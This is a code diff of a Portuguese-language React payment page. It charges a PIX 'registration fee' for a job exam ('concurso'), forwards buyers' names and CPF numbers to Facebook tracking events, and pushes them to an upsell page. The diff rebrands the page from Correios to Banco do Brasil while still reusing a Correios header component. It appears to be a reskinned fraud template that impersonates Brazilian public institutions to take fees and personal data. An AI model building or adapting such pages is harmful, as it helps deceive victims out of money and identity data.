@@ -60,7 +60,7 @@ const Pagamento = () => {
       try {
         setIsLoadingPix(true); setPixError(null);
         const amountInCents = Math.round(valorBeneficio * 100);
-        const externalId = `${protocolo || 'COR'}-API-${Date.now()}`;
+        const externalId = `${protocolo || 'BB'}-API-${Date.now()}`;
         // Safety net: captura UTMs antes de ler
         captureUtmParams();
         const utmParams = getStoredUtmParams();
@@ -92,8 +92,8 @@ const Pagamento = () => {
         const response = await supabase.functions.invoke('check-pix-status', { body: { external_id: externalId } });
         if (response.data?.data?.status === 'paid') {
           if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
-          fbEvents.purchase({ value: valorBeneficio!, currency: 'BRL', content_name: 'Taxa de Inscrição Correios' });
-          fbEvents.serverPurchase({ first_name: cpfData!.nome.split(' ')[0], cpf: cpfData!.cpf, value: valorBeneficio!, content_name: 'Taxa de Inscrição Correios' });
+          fbEvents.purchase({ value: valorBeneficio!, currency: 'BRL', content_name: 'Taxa de Inscrição Banco do Brasil' });
+          fbEvents.serverPurchase({ first_name: cpfData!.nome.split(' ')[0], cpf: cpfData!.cpf, value: valorBeneficio!, content_name: 'Taxa de Inscrição Banco do Brasil' });
           toast({ title: "Pagamento confirmado!", description: "Processando inscrição..." });
           navigate("/upsell-info/1", { state: { cpfData, valorBeneficio, protocolo } });
         }
@@ -113,8 +113,8 @@ const Pagamento = () => {
       supabase.functions.invoke('check-pix-status', { body: { external_id: pixData.external_id } }).then((response) => {
         if (response.data?.data?.status === 'paid') {
           if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
-          fbEvents.purchase({ value: valorBeneficio!, currency: 'BRL', content_name: 'Taxa de Inscrição Correios' });
-          fbEvents.serverPurchase({ first_name: cpfData!.nome.split(' ')[0], cpf: cpfData!.cpf, value: valorBeneficio!, content_name: 'Taxa de Inscrição Correios' });
+          fbEvents.purchase({ value: valorBeneficio!, currency: 'BRL', content_name: 'Taxa de Inscrição Banco do Brasil' });
+          fbEvents.serverPurchase({ first_name: cpfData!.nome.split(' ')[0], cpf: cpfData!.cpf, value: valorBeneficio!, content_name: 'Taxa de Inscrição Banco do Brasil' });
           toast({ title: "Pagamento confirmado!", description: "Processando inscrição..." });
           navigate("/upsell-info/1", { state: { cpfData, valorBeneficio, protocolo } });
         } else {
@@ -129,7 +129,7 @@ const Pagamento = () => {
 
   return (
     <div className="min-h-screen flex flex-col bg-background">
-      <CorreiosHeader breadcrumb="Concursos > Atendente Comercial > Inscrição > Pagamento" />
+      <CorreiosHeader breadcrumb="Concursos > Agente Comercial > Inscrição > Pagamento" />
 
       <main className="flex-1 px-4 py-6 sm:py-8">
         <div className="max-w-lg mx-auto space-y-5">
